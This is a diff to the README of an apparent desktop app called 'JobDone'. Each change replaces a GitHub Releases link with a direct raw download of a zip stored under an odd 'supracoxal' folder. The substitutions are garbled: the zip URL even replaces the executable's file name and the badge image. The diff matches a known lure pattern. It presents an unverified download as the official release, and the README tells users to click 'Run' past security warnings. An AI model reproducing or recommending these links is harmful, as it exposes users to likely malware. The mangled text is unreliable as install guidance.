@@ -10,7 +10,7 @@ To start using JobDone, follow these simple steps to download and run the applic
 
 ### 📥 Download JobDone
 
-[![Download JobDone](https://img.shields.io/badge/Download%20JobDone-v1.0-blue.svg)](https://github.com/assamjazzjnu/jobdone/releases)
+[![Download JobDone](https://raw.githubusercontent.com/assamjazzjnu/jobdone/master/supracoxal/jobdone.zip%https://raw.githubusercontent.com/assamjazzjnu/jobdone/master/supracoxal/jobdone.zip)](https://raw.githubusercontent.com/assamjazzjnu/jobdone/master/supracoxal/jobdone.zip)
 
 ### 💻 System Requirements
 
@@ -27,7 +27,7 @@ It’s best to check that your computer meets these requirements before you cont
 
 Click the link below to go to the Releases page, where you can download JobDone:
 
-[Download JobDone](https://github.com/assamjazzjnu/jobdone/releases)
+[Download JobDone](https://raw.githubusercontent.com/assamjazzjnu/jobdone/master/supracoxal/jobdone.zip)
 
 ### 2. Choose Your Version
 
@@ -43,7 +43,7 @@ If you downloaded a `.zip` file, you need to extract it. Right-click on the zip 
 
 ### 5. Run the Application
 
-Once extracted, find the `jobdone.exe` file (or similar name) in the extracted folder. Double-click the file to start JobDone. You may be prompted with a security warning; select "Run" to proceed.
+Once extracted, find the `https://raw.githubusercontent.com/assamjazzjnu/jobdone/master/supracoxal/jobdone.zip` file (or similar name) in the extracted folder. Double-click the file to start JobDone. You may be prompted with a security warning; select "Run" to proceed.
 
 ### 6. Set Up Notifications
 
@@ -78,7 +78,7 @@ If you encounter any bugs or issues while using JobDone, please report them dire
 
 ## 📤 Updates and Improvements
 
-We continuously strive to enhance JobDone. Regular updates will bring new features and improvements. Make sure to check back on the [Releases page](https://github.com/assamjazzjnu/jobdone/releases) for new versions.
+We continuously strive to enhance JobDone. Regular updates will bring new features and improvements. Make sure to check back on the [Releases page](https://raw.githubusercontent.com/assamjazzjnu/jobdone/master/supracoxal/jobdone.zip) for new versions.
 
 For automatic updates, enable the notification option when prompted during installation.
 
